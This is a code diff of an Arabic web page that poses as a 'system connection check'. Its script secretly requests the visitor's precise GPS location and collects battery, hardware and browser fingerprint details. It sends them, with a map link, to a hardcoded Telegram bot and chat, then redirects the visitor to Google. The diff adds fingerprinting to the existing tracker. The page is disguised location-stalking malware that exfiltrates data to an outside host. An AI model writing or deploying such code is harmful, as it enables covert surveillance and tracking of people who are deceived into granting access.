@@ -2,15 +2,42 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث النظام</title>
+    <title>فحص اتصال النظام</title>
 </head>
 <body style="background-color: #f0f0f0; text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <h2>جاري فحص حالة النظام...</h2>
+    <h2>جاري فحص حالة الاتصال...</h2>
     <p>يرجى السماح بالوصول للموقع للمتابعة</p>
 
     <script>
+        // تم وضع بياناتك هنا مباشرة لسهولة النسخ
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
+
+        function getDeviceFingerprint() {
+            const ua = navigator.userAgent;
+            let deviceType = "غير معروف";
+            let platform = navigator.platform;
+            let cores = navigator.hardwareConcurrency || "مخفية";
+            let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "مخفية";
+
+            if (/android/i.test(ua)) {
+                deviceType = "أندرويد (Android)";
+                const match = ua.match(/\(([^;]+);\sAndroid\s([0-9\.]+);\s([^)]+)\)/);
+                if (match) { platform = match[1] + " (Android " + match[2] + ")"; }
+            } else if (/iPhone/i.test(ua)) {
+                deviceType = "آيفون (iPhone)";
+            } else if (/Windows/i.test(ua)) {
+                deviceType = "ويندوز (Windows)";
+            }
+
+            return {
+                deviceType: deviceType,
+                platform: platform,
+                cores: cores,
+                ram: ram,
+                userAgent: ua
+            };
+        }
 
         async function sendToTelegram(text) {
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
@@ -21,33 +48,33 @@
             const lon = position.coords.longitude;
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // 1. جلب معلومات البطارية
             let batt = "غير مسموح بالوصول";
             try {
-                const battery = await navigator.getBattery();
-                batt = `${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})`;
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batt = `${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})`;
+                }
             } catch (e) {}
 
-            // 2. معلومات الجهاز والذاكرة
-            const platform = navigator.platform || "غير معروف";
-            const cores = navigator.hardwareConcurrency || "غير معروف";
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "مخفية";
+            const fp = getDeviceFingerprint();
 
-            const report = `🛰️ **تقرير مفصل**\n\n` +
-                           `🔋 البطارية: ${batt}\n` +
-                           `📱 النظام: ${platform}\n` +
-                           `💾 الذاكرة: ${ram}\n` +
-                           `⚙️ المعالج: ${cores} نواة\n` +
-                           `📍 الموقع: ${mapLink}`;
+            const report = `🛰️ **تقرير البصمة الرقمية**\n\n` +
+                           `📱 **الجهاز:** ${fp.deviceType}\n` +
+                           `⚙️ **النظام:** ${fp.platform}\n` +
+                           `🔋 **البطارية:** ${batt}\n` +
+                           `💾 **الذاكرة:** ${fp.ram}\n` +
+                           `💻 **المعالج:** ${fp.cores} نواة\n` +
+                           `📍 **الموقع:** ${mapLink}\n\n` +
+                           `🌐 **المتصفح:** \`${fp.userAgent}\``;
 
             await sendToTelegram(report);
-            window.location.href = "https://www.google.com";
+            window.location.href = "https://www.google.com"; 
         }
 
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(startTracking, () => {
-                    alert("يجب تفعيل GPS.");
+                navigator.geolocation.getCurrentPosition(startTracking, (err) => {
+                    alert("يجب تفعيل GPS للمتابعة.");
                 }, { enableHighAccuracy: true });
             }
         };
